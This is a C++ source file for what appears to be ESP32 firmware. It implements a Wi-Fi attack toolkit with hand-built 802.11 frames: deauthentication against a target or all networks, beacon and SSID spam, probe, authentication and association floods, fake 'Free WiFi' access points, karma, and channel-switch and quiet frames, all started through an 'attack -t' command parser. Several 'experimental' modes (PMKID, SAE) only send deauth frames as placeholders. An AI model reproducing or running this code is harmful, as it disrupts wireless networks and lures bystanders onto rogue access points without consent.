#include "WiFiAttack.h"

// 802.11 packet helpers
static const uint8_t BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

WiFiAttack::WiFiAttack()
  : running(false), attackMode(MODE_NONE), channel(6), ssidIndex(0),
    hopping(false), cycling(false), randomSsidCount(8),
    lastTx(0), lastHop(0), lastSsidCycle(0), lastStatus(0),
    txInterval(5), hopInterval(5000), ssidCycleInterval(5000),
    packetCount(0), seqNum(0), hidden(false) {}

void WiFiAttack::stop() {
  running = false;
  packetCount = 0;
  ssidIndex = 0;
  // Return to the configured AP mode so the Web OS stays reachable
  if (attackMode == MODE_FAKE_AP) {
    // restore AP managed by main.cpp
  }
  attackMode = MODE_NONE;
}

const char* WiFiAttack::getModeName() const {
  switch (attackMode) {
    case MODE_DEAUTH:       return "Deauth";
    case MODE_DEAUTH_ALL:   return "Deauth All";
    case MODE_BEACON:       return "Beacon";
    case MODE_PROBE:        return "Probe";
    case MODE_SSID_SPAM:    return "SSID Spam";
    case MODE_FAKE_AP:      return "Fake AP";
    case MODE_KARMA:        return "Karma";
    case MODE_RANDOM_SSID:  return "Random SSID";
    case MODE_AUTH_FLOOD:   return "Auth Flood";
    case MODE_ASSOC_FLOOD:  return "Assoc Flood";
    case MODE_PMKID:        return "PMKID";
    case MODE_SAE:          return "SAE";
    case MODE_CSA:          return "CSA";
    case MODE_QUIET:        return "Quiet";
    case MODE_BADMSG:       return "Bad Message";
    case MODE_SLEEP:        return "Sleep";
    default:                return "Idle";
  }
}

void WiFiAttack::baseSetup(uint8_t mode) {
  attackMode = mode;
  running = true;
  packetCount = 0;
  seqNum = 0;
  lastTx = 0;
  lastHop = 0;
  lastSsidCycle = 0;
  lastStatus = 0;
  ssidIndex = 0;
  // Keep the AP running; do not change the channel to avoid disconnecting clients
  if (WiFi.getMode() != WIFI_AP_STA) WiFi.mode(WIFI_AP_STA);
  // The real channel switch would drop AP clients; attacks run on the AP's channel
  // if (channel > 0 && channel <= 13) esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

// --- Utility ---

void WiFiAttack::macFromString(const String& s, uint8_t* out) const {
  memset(out, 0, 6);
  int vals[6] = {0};
  if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x", &vals[0], &vals[1], &vals[2], &vals[3], &vals[4], &vals[5]) == 6) {
    for (int i = 0; i < 6; i++) out[i] = (uint8_t)vals[i];
  }
}

void WiFiAttack::randomMac(uint8_t* out) const {
  for (int i = 0; i < 6; i++) out[i] = random(256);
  out[0] &= 0xFE; out[0] |= 0x02; // locally administered
}

void WiFiAttack::bssidMac(uint8_t* out) const {
  if (customBssid.length() >= 17) {
    macFromString(customBssid, out);
    out[0] = (out[0] & 0xFE) | 0x02;
  } else {
    randomMac(out);
  }
}

// --- Starters ---

void WiFiAttack::startDeauth(uint8_t targetIdx, const String& bssid) {
  baseSetup(MODE_DEAUTH);
  if (bssid.length() >= 17) {
    AttackTarget t = {String(), bssid, 0, channel};
    targets.clear(); targets.push_back(t);
  } else if (targetIdx < targets.size()) {
    // keep that target, already in targets
  } else {
    targets.clear();
  }
  txInterval = 10;
}

void WiFiAttack::startDeauthAll() {
  baseSetup(MODE_DEAUTH_ALL);
  txInterval = 5;
  hopping = true;
  hopInterval = 3000;
}

void WiFiAttack::startBeacon(const std::vector<String>& ssids, bool cycle) {
  baseSetup(MODE_BEACON);
  ssidList = ssids;
  cycling = cycle;
  txInterval = 5;
  ssidCycleInterval = 2000;
}

void WiFiAttack::startProbe(const std::vector<String>& ssids, bool flood) {
  baseSetup(MODE_PROBE);
  ssidList = ssids;
  txInterval = flood ? 1 : 50;
  cycling = false; // probe list is sent mixed
}

void WiFiAttack::startSsidSpam(const std::vector<String>& ssids) {
  startBeacon(ssids, true);
  attackMode = MODE_SSID_SPAM;
}

void WiFiAttack::startFakeAp(const std::vector<String>& ssids, const String& pass, bool hid) {
  baseSetup(MODE_FAKE_AP);
  ssidList = ssids;
  password = pass;
  hidden = hid;
  cycling = (ssids.size() > 1);
  if (ssids.empty()) { ssidList.push_back("Free WiFi"); }
  // Use the real softAP so clients can actually associate
  String s = ssidList[0];
  if (password.length() >= 8 && password.length() <= 63)
    WiFi.softAP(s.c_str(), password.c_str(), channel, hidden ? 1 : 0, 4);
  else
    WiFi.softAP(s.c_str(), NULL, channel, hidden ? 1 : 0, 4);
}

void WiFiAttack::startKarma() {
  baseSetup(MODE_KARMA);
  txInterval = 10;
}

void WiFiAttack::startRandomSsid(int count) {
  baseSetup(MODE_RANDOM_SSID);
  randomSsidCount = count;
  ssidList.clear();
  const char alfa[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  for (int i = 0; i < count; i++) {
    String s;
    for (int j = 0; j < 10; j++) s += alfa[random(strlen(alfa))];
    ssidList.push_back(s);
  }
  cycling = true;
  txInterval = 5;
}

void WiFiAttack::startAuthFlood(const String& bssid) {
  baseSetup(MODE_AUTH_FLOOD);
  customBssid = bssid;
  txInterval = 1;
}

void WiFiAttack::startAssocFlood(const String& bssid) {
  baseSetup(MODE_ASSOC_FLOOD);
  customBssid = bssid;
  txInterval = 1;
}

void WiFiAttack::startPmkid(const String& bssid) {
  baseSetup(MODE_PMKID);
  customBssid = bssid;
  txInterval = 50;
}

void WiFiAttack::startSae(const String& bssid) {
  baseSetup(MODE_SAE);
  customBssid = bssid;
  txInterval = 50;
}

void WiFiAttack::startCsa(const String& bssid, uint8_t newChannel) {
  baseSetup(MODE_CSA);
  customBssid = bssid;
  channel = newChannel;
  txInterval = 100;
}

void WiFiAttack::startQuiet(const String& bssid, uint8_t duration, uint8_t period) {
  baseSetup(MODE_QUIET);
  customBssid = bssid;
  txInterval = 100;
}

void WiFiAttack::startBadMsg(const String& bssid) {
  baseSetup(MODE_BADMSG);
  customBssid = bssid;
  txInterval = 50;
}

void WiFiAttack::startSleep(const String& bssid) {
  baseSetup(MODE_SLEEP);
  customBssid = bssid;
  txInterval = 50;
}

// --- Loop ---

void WiFiAttack::update(uint32_t now) {
  if (!running) return;

  if (hopping) channelHop(now);
  if (cycling) cycleSsid(now);
  doTx(now);
  broadcastStatus(now);
}

void WiFiAttack::channelHop(uint32_t now) {
  if (now - lastHop < hopInterval) return;
  lastHop = now;
  channel++;
  if (channel > 13) channel = 1;
  // Disabled to keep the AP stable; sniffer/attack runs on AP's channel
  // esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

void WiFiAttack::cycleSsid(uint32_t now) {
  if (ssidList.size() <= 1) return;
  if (now - lastSsidCycle < ssidCycleInterval) return;
  lastSsidCycle = now;
  ssidIndex = (ssidIndex + 1) % ssidList.size();
  if (attackMode == MODE_FAKE_AP && !ssidList.empty()) {
    const String& s = ssidList[ssidIndex];
    if (password.length() >= 8 && password.length() <= 63)
      WiFi.softAP(s.c_str(), password.c_str(), channel, hidden ? 1 : 0, 4);
    else
      WiFi.softAP(s.c_str(), NULL, channel, hidden ? 1 : 0, 4);
  }
}

void WiFiAttack::broadcastStatus(uint32_t now) {
  if (now - lastStatus < 1000) return;
  lastStatus = now;
  // main.cpp will build and send a JSON status; we just expose getters
}

void WiFiAttack::doTx(uint32_t now) {
  if (now - lastTx < txInterval) return;
  lastTx = now;

  uint8_t bssid[6];
  uint8_t client[6];

  switch (attackMode) {
    case MODE_DEAUTH: {
      if (targets.empty()) return;
      bssidMac(bssid);
      macFromString(targets[0].bssid, client); // treat as target
      if (targets[0].bssid.length() < 17) return;
      txDeauth(client, bssid, 7); // from random client to AP
      txDeauth(bssid, BROADCAST, 7); // from AP to broadcast
      packetCount += 2;
      break;
    }
    case MODE_DEAUTH_ALL: {
      for (const auto& t : targets) {
        if (t.bssid.length() < 17) continue;
        macFromString(t.bssid, bssid);
        randomMac(client);
        txDeauth(client, bssid, 7);
        packetCount++;
      }
      if (targets.empty()) {
        randomMac(client);
        txDeauth(client, BROADCAST, 7);
        packetCount++;
      }
      break;
    }
    case MODE_BEACON:
    case MODE_SSID_SPAM:
    case MODE_RANDOM_SSID: {
      if (ssidList.empty()) return;
      bssidMac(bssid);
      const String& s = ssidList[ssidIndex % ssidList.size()];
      txBeacon(s, bssid, channel);
      packetCount++;
      break;
    }
    case MODE_PROBE: {
      if (ssidList.empty()) return;
      randomMac(client);
      for (const auto& s : ssidList) {
        txProbeReq(s, client);
        packetCount++;
      }
      break;
    }
    case MODE_KARMA: {
      randomMac(client);
      txProbeReq("", client);
      packetCount++;
      break;
    }
    case MODE_AUTH_FLOOD: {
      bssidMac(bssid);
      randomMac(client);
      txAuth(bssid, client);
      packetCount++;
      break;
    }
    case MODE_ASSOC_FLOOD: {
      bssidMac(bssid);
      randomMac(client);
      txAssocReq(bssid, client);
      packetCount++;
      break;
    }
    case MODE_FAKE_AP:
      // Fake AP uses the real softAP; no raw frames needed
      packetCount += 5; // arbitrary status tick
      break;
    case MODE_CSA: {
      bssidMac(bssid);
      txActionCsa(bssid, channel);
      packetCount++;
      break;
    }
    case MODE_QUIET: {
      bssidMac(bssid);
      txActionQuiet(bssid, 30, 0);
      packetCount++;
      break;
    }
    case MODE_PMKID:
    case MODE_SAE:
    case MODE_BADMSG:
    case MODE_SLEEP:
      // Advanced: send a deauth as a placeholder; marked in main.cpp as placeholder
      bssidMac(bssid);
      randomMac(client);
      txDeauth(client, bssid, 7);
      packetCount++;
      break;
    default:
      break;
  }
}

// --- Frame builders ---

void WiFiAttack::txDeauth(const uint8_t* bssid, const uint8_t* client, uint8_t reason) const {
  uint8_t pkt[26];
  memset(pkt, 0, sizeof(pkt));
  pkt[0] = 0xC0; pkt[1] = 0x00; // management, deauth
  pkt[2] = 0x00; pkt[3] = 0x00; // duration
  memcpy(pkt + 4, client, 6);
  memcpy(pkt + 10, bssid, 6);
  memcpy(pkt + 16, bssid, 6);
  pkt[22] = (seqNum * 16) & 0xFF;
  pkt[23] = ((seqNum * 16) >> 8) & 0xFF;
  pkt[24] = reason;
  pkt[25] = 0x00;
  esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
  // seq increment handled in calling loop if needed
}

void WiFiAttack::txBeacon(const String& ssid, const uint8_t* bssid, uint8_t ch) const {
  uint8_t pkt[256];
  int i = 0;
  // 802.11 management header
  pkt[i++] = 0x80; pkt[i++] = 0x00; // FC: beacon
  pkt[i++] = 0x00; pkt[i++] = 0x00; // duration
  memcpy(pkt + i, BROADCAST, 6); i += 6;
  memcpy(pkt + i, bssid, 6); i += 6;
  memcpy(pkt + i, bssid, 6); i += 6;
  pkt[i++] = 0x00; pkt[i++] = 0x00; // seq
  // fixed parameters
  memset(pkt + i, 0, 8); i += 8; // timestamp
  pkt[i++] = 0x64; pkt[i++] = 0x00; // beacon interval 100 TU
  pkt[i++] = 0x21; pkt[i++] = 0x04; // capabilities
  // SSID tag
  pkt[i++] = 0x00;
  pkt[i++] = (uint8_t)min((size_t)32, (size_t)ssid.length());
  memcpy(pkt + i, ssid.c_str(), pkt[i - 1]); i += pkt[i - 1];
  // supported rates
  pkt[i++] = 0x01; pkt[i++] = 0x04;
  pkt[i++] = 0x82; pkt[i++] = 0x84; pkt[i++] = 0x8B; pkt[i++] = 0x96;
  // DS parameter
  pkt[i++] = 0x03; pkt[i++] = 0x01; pkt[i++] = ch;
  // extended rates
  pkt[i++] = 0x32; pkt[i++] = 0x04;
  pkt[i++] = 0x0C; pkt[i++] = 0x12; pkt[i++] = 0x18; pkt[i++] = 0x24;

  esp_wifi_80211_tx(WIFI_IF_AP, pkt, i, false);
}

void WiFiAttack::txProbeReq(const String& ssid, const uint8_t* sa) const {
  uint8_t pkt[256];
  int i = 0;
  pkt[i++] = 0x40; pkt[i++] = 0x00; // FC: probe req
  pkt[i++] = 0x00; pkt[i++] = 0x00; // duration
  memcpy(pkt + i, BROADCAST, 6); i += 6;
  memcpy(pkt + i, sa, 6); i += 6;
  memcpy(pkt + i, BROADCAST, 6); i += 6;
  pkt[i++] = 0x00; pkt[i++] = 0x00; // seq
  // SSID tag
  pkt[i++] = 0x00;
  pkt[i++] = (uint8_t)min((size_t)32, (size_t)ssid.length());
  if (ssid.length() > 0) {
    memcpy(pkt + i, ssid.c_str(), pkt[i - 1]); i += pkt[i - 1];
  }
  // supported rates
  pkt[i++] = 0x01; pkt[i++] = 0x04;
  pkt[i++] = 0x82; pkt[i++] = 0x84; pkt[i++] = 0x8B; pkt[i++] = 0x96;
  // DS parameter (optional)
  pkt[i++] = 0x03; pkt[i++] = 0x01; pkt[i++] = channel;

  esp_wifi_80211_tx(WIFI_IF_AP, pkt, i, false);
}

void WiFiAttack::txProbeResp(const String& ssid, const uint8_t* bssid, const uint8_t* client, uint8_t ch) const {
  uint8_t pkt[256];
  int i = 0;
  pkt[i++] = 0x50; pkt[i++] = 0x00; // FC: probe resp
  pkt[i++] = 0x00; pkt[i++] = 0x00;
  memcpy(pkt + i, client, 6); i += 6;
  memcpy(pkt + i, bssid, 6); i += 6;
  memcpy(pkt + i, bssid, 6); i += 6;
  pkt[i++] = 0x00; pkt[i++] = 0x00;
  memset(pkt + i, 0, 8); i += 8;
  pkt[i++] = 0x64; pkt[i++] = 0x00;
  pkt[i++] = 0x21; pkt[i++] = 0x04;
  pkt[i++] = 0x00;
  pkt[i++] = (uint8_t)min((size_t)32, (size_t)ssid.length());
  memcpy(pkt + i, ssid.c_str(), pkt[i - 1]); i += pkt[i - 1];
  pkt[i++] = 0x01; pkt[i++] = 0x04;
  pkt[i++] = 0x82; pkt[i++] = 0x84; pkt[i++] = 0x8B; pkt[i++] = 0x96;
  pkt[i++] = 0x03; pkt[i++] = 0x01; pkt[i++] = ch;
  esp_wifi_80211_tx(WIFI_IF_AP, pkt, i, false);
}

void WiFiAttack::txAuth(const uint8_t* bssid, const uint8_t* client) const {
  uint8_t pkt[30];
  memset(pkt, 0, sizeof(pkt));
  pkt[0] = 0xB0; pkt[1] = 0x00; // auth
  memcpy(pkt + 4, bssid, 6);
  memcpy(pkt + 10, client, 6);
  memcpy(pkt + 16, bssid, 6);
  pkt[24] = 0x00; pkt[25] = 0x00; // auth algo 0 (open)
  pkt[26] = 0x01; pkt[27] = 0x00; // seq 1
  pkt[28] = 0x00; pkt[29] = 0x00; // status 0
  esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
}

void WiFiAttack::txAssocReq(const uint8_t* bssid, const uint8_t* client) const {
  uint8_t pkt[256];
  int i = 0;
  pkt[i++] = 0x00; pkt[i++] = 0x00; // assoc req
  pkt[i++] = 0x00; pkt[i++] = 0x00;
  memcpy(pkt + i, bssid, 6); i += 6;
  memcpy(pkt + i, client, 6); i += 6;
  memcpy(pkt + i, bssid, 6); i += 6;
  pkt[i++] = 0x00; pkt[i++] = 0x00;
  pkt[i++] = 0x01; pkt[i++] = 0x00; // listen interval
  pkt[i++] = 0x21; pkt[i++] = 0x04; // cap
  pkt[i++] = 0x00; pkt[i++] = 0x00; // SSID empty
  pkt[i++] = 0x01; pkt[i++] = 0x04;
  pkt[i++] = 0x82; pkt[i++] = 0x84; pkt[i++] = 0x8B; pkt[i++] = 0x96;
  esp_wifi_80211_tx(WIFI_IF_AP, pkt, i, false);
}

void WiFiAttack::txActionCsa(const uint8_t* bssid, uint8_t newChannel) const {
  uint8_t pkt[64];
  int i = 0;
  pkt[i++] = 0xD0; pkt[i++] = 0x00; // action
  pkt[i++] = 0x00; pkt[i++] = 0x00;
  memcpy(pkt + i, BROADCAST, 6); i += 6;
  memcpy(pkt + i, bssid, 6); i += 6;
  memcpy(pkt + i, bssid, 6); i += 6;
  pkt[i++] = 0x00; pkt[i++] = 0x00;
  // Category + Action
  pkt[i++] = 0x00; // Spectrum management
  pkt[i++] = 0x04; // CSA
  // CSA mode, channel, count
  pkt[i++] = 0x01;
  pkt[i++] = newChannel;
  pkt[i++] = 0x03;
  esp_wifi_80211_tx(WIFI_IF_AP, pkt, i, false);
}

void WiFiAttack::txActionQuiet(const uint8_t* bssid, uint8_t duration, uint8_t period) const {
  uint8_t pkt[64];
  int i = 0;
  pkt[i++] = 0xD0; pkt[i++] = 0x00;
  pkt[i++] = 0x00; pkt[i++] = 0x00;
  memcpy(pkt + i, BROADCAST, 6); i += 6;
  memcpy(pkt + i, bssid, 6); i += 6;
  memcpy(pkt + i, bssid, 6); i += 6;
  pkt[i++] = 0x00; pkt[i++] = 0x00;
  pkt[i++] = 0x00; // category
  pkt[i++] = 0x05; // Quiet
  pkt[i++] = period; // quiet period
  pkt[i++] = 0x00; // reserved
  pkt[i++] = duration; // quiet duration
  pkt[i++] = 0x00; pkt[i++] = 0x00; // offset
  esp_wifi_80211_tx(WIFI_IF_AP, pkt, i, false);
}

// --- Command parser ---

String WiFiAttack::runCommand(const String& raw) {
  String s = raw;
  s.trim();
  String lower = s;
  lower.toLowerCase();
  if (!lower.startsWith("attack ")) {
    return "Not an attack command";
  }

  // Simple tokenizer on spaces, respecting single/double quotes
  std::vector<String> tok;
  int p = 0;
  while (p < s.length()) {
    while (p < s.length() && s[p] == ' ') p++;
    if (p >= s.length()) break;
    char q = 0;
    if (s[p] == '"' || s[p] == '\'') { q = s[p]; p++; }
    int e = p;
    while (e < s.length()) {
      if (q) { if (s[e] == q) break; }
      else { if (s[e] == ' ') break; }
      e++;
    }
    String val = s.substring(p, e);
    if (q && e < s.length() && s[e] == q) e++;
    tok.push_back(val);
    p = e;
  }

  if (tok.size() < 3) {
    return "Usage: attack -t <type> [options]";
  }

  String type;
  uint8_t ch = 6;
  String ssidArg;
  String pass;
  String bssid;
  bool hidden = false;
  bool cycle = false;
  bool random = false;
  bool hop = false;
  int count = 8;
  int apIdx = -1;

  for (size_t i = 1; i < tok.size(); i++) {
    const String& t = tok[i];
    if (t == "-t" && i + 1 < tok.size()) { type = tok[++i]; }
    else if (t == "-ch" && i + 1 < tok.size()) { ch = tok[++i].toInt(); if (ch < 1 || ch > 13) ch = 6; }
    else if (t == "-s" && i + 1 < tok.size()) { ssidArg = tok[++i]; }
    else if (t == "-p" && i + 1 < tok.size()) { pass = tok[++i]; }
    else if (t == "-b" && i + 1 < tok.size()) { bssid = tok[++i]; }
    else if (t == "-a" && i + 1 < tok.size()) { apIdx = tok[++i].toInt(); }
    else if (t == "-c" && i + 1 < tok.size()) { count = tok[++i].toInt(); }
    else if (t == "-h") { hidden = true; }
    else if (t == "-l") { cycle = true; }
    else if (t == "-r") { random = true; }
    else if (t == "-hop") { hop = true; }
  }

  setChannel(ch);

  std::vector<String> ssids;
  if (ssidArg.length()) {
    ssidArg.replace(",", "\n");
    int start = 0;
    while (start < ssidArg.length()) {
      int nl = ssidArg.indexOf('\n', start);
      if (nl == -1) nl = ssidArg.length();
      String part = ssidArg.substring(start, nl);
      part.trim();
      if (part.length()) ssids.push_back(part);
      start = nl + 1;
    }
  }

  if (ssidArg.length() == 0 && type != "fakeap" && type != "beacon" && type != "probe" && type != "ssidspam") {
    // fallback: use the first target as bssid
  }

  if (bssid.length() >= 17) {
    customBssid = bssid;
  }

  if (apIdx >= 0 && apIdx < (int)targets.size()) {
    customBssid = targets[apIdx].bssid;
  } else if (apIdx >= 0 && apIdx >= (int)targets.size()) {
    return "AP index out of range";
  }

  if (type == "deauth") {
    if (customBssid.length() < 17 && !targets.empty()) customBssid = targets[0].bssid;
    if (customBssid.length() < 17) return "Need a target BSSID (-b) or a scanned AP index (-a)";
    startDeauth(0, customBssid);
    return "Deauth started on " + customBssid + " ch" + ch;
  }
  if (type == "deauthall") {
    startDeauthAll();
    return "Deauth-all started";
  }
  if (type == "beacon") {
    if (ssids.empty()) return "Need SSIDs with -s";
    startBeacon(ssids, cycle);
    return "Beacon spam started";
  }
  if (type == "probe") {
    startProbe(ssids, false);
    return "Probe spam started";
  }
  if (type == "probeflood") {
    startProbe(ssids, true);
    return "Probe flood started";
  }
  if (type == "ssidspam") {
    if (ssids.empty()) return "Need SSIDs with -s";
    startSsidSpam(ssids);
    return "SSID spam started";
  }
  if (type == "fakeap") {
    if (ssids.empty()) ssids.push_back("Free WiFi");
    startFakeAp(ssids, pass, hidden);
    return "Fake AP started: " + ssids[0];
  }
  if (type == "karma") {
    startKarma();
    return "Karma started";
  }
  if (type == "randomssid") {
    startRandomSsid(count);
    return "Random SSID started";
  }
  if (type == "authflood") {
    if (customBssid.length() < 17) return "Need target BSSID (-b)";
    startAuthFlood(customBssid);
    return "Auth flood started";
  }
  if (type == "assocflood") {
    if (customBssid.length() < 17) return "Need target BSSID (-b)";
    startAssocFlood(customBssid);
    return "Assoc flood started";
  }
  if (type == "pmkid") {
    if (customBssid.length() < 17) return "Need target BSSID (-b)";
    startPmkid(customBssid);
    return "PMKID attack started (experimental)";
  }
  if (type == "sae") {
    if (customBssid.length() < 17) return "Need target BSSID (-b)";
    startSae(customBssid);
    return "SAE attack started (experimental)";
  }
  if (type == "csa") {
    if (customBssid.length() < 17) return "Need target BSSID (-b)";
    startCsa(customBssid, ch);
    return "CSA attack started";
  }
  if (type == "quiet") {
    if (customBssid.length() < 17) return "Need target BSSID (-b)";
    startQuiet(customBssid, 30, 0);
    return "Quiet attack started";
  }
  if (type == "badmsg") {
    if (customBssid.length() < 17) return "Need target BSSID (-b)";
    startBadMsg(customBssid);
    return "Bad message attack started (experimental)";
  }
  if (type == "sleep") {
    if (customBssid.length() < 17) return "Need target BSSID (-b)";
    startSleep(customBssid);
    return "Sleep attack started (experimental)";
  }

  return "Unknown attack type: " + type;
}
